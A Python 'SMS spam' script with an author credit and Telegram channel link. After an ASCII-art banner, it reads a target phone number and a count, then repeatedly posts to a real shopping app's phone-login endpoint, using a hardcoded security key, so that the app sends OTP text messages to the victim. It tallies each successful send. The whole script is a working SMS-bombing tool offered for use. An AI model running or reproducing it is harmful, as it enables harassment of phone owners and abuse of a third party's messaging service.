import requests
import pyfiglet
import requests,os,sys,time,pyfiglet
from time import sleep
red_color = '\033[1;31m'
yellow_color = '\033[1;33m'
green_color = '\033[2;32m'
white_color = '\033[1;97m'
blue_color = '\033[1;34m'
light_blue_color = '\033[2;36m'
light_green_color = '\033[1;32m'
light_yellow_color = '\033[1;33m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
C = "\033[1;97m" #ابيض
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
print(F+"---------  Welcome My Script {Spam Sms For all networks  } --------")
time.sleep(1.5)
print()
print(B+"="*60)
time.sleep(1.5)
print("""
\033[1;93m _____ ____  _   _             """)
time.sleep(1.5)             
print("""\033[1;95m| ____| __ )| \ | |            """)  
time.sleep(1.5)               
print("""\033[1;92m|  _| |  _ \|  \| |              """)  
time.sleep(1.5)            
print("""\033[1;97m| |___| |_) | |\  |                              """)    
time.sleep(1.5) 
print("""\033[1;91m|_____|____/|_| \_|  _  __    _    ____ _____ ____   """)
time.sleep(1.5)
print("""\033[1;93m| ____| |      / \  | |/ /   / \  | __ )| ____|  _ \  """)
time.sleep(1.5)
print("""\033[1;92m|  _| | |     / _ \ | ' /   / _ \ |  _ \|  _| | |_) |""") 
time.sleep(1.5)
print("""\033[1;95m| |___| |___ / ___ \| . \  / ___ \| |_) | |___|  _ <  """) 
time.sleep(1.5)
print("""\033[1;97m|_____|_____/_/   \_\_|\_\/_/   \_\____/|_____|_| \_\
""")
time.sleep(1.5)

print("""
""")
time.sleep(1.5)
print(B+"---------------------------by Mohamed Safwat--------------------")
time.sleep(1.5)
print(E+"""
Dev => Mohamed Safwat
My User =>@QWNWJ
My Chaneel => https://t.me/XXoXXo0
""")
time.sleep(1.5)
print(C+                     "أّنِأّ لَمَ أّخَلَقِ لَأګوِنِ مَثّلَ-ِمَ بِلَ لَأګوِنِ حٌلَمَ-ِمَ 𝆹𝅥𝅮")
time.sleep(1.5)
print("")
time.sleep(1.5)
print(B+"="*60)
time.sleep(1.5)
print()
number =input(Y+"Enter Your Number : \033[1;33m")
print()
time.sleep(1.5)

m = int(input(green_color + "Enter a Number of messages  : " + light_blue_color))
sent_count = 0

for _ in range(m):
    url3 ="https://new-app.waffarha.com/api/loginByPhone"

    headers3 = {
        "accept": "application/json",
        "accept-language": "ar",
        "accept-encoding": "gzip",
        "content-length": "220",
        "host": "new-app.waffarha.com",
        "content-type": "application/json",
        "end_point": "loginByPhone",
    }

    data3 ='{"security_key":"f51e1cff3051d79e8a15a59907af64b0","city":"3","limit":"5","phone":"%s","app_version":"7.8.31","platform":"Android","device_token":"47e20e59f77ede50","lang":"ar","brand":"LV1","store":"PlayStore"}'%(number)

    r3 = requests.post(url3, headers=headers3, data=data3).text
    if '{"data":{"html_message":' in r3:
        sent_count += 1
        print("   ({} Done send message Successfully ✅)".format(sent_count))
    elif '{"status":200}' in r3:
        print("You cannot spam this number ")
    else:
        print("Wrong number ")
        print()
        time.sleep(1.5)
        
